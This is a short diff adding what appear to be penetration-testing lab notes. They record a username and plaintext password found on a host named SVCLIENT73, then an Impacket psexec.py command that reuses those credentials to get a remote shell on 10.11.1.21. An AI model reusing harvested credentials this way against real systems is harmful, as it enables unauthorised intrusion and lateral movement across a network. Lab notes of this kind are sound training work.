@@ -1,0 +1,6 @@
+In SVCLIENT73 I found 
+
+user: pete 
+password: ThisIsTheUsersPassword19
+
+psexec.py pete:ThisIsTheUsersPassword19@10.11.1.21
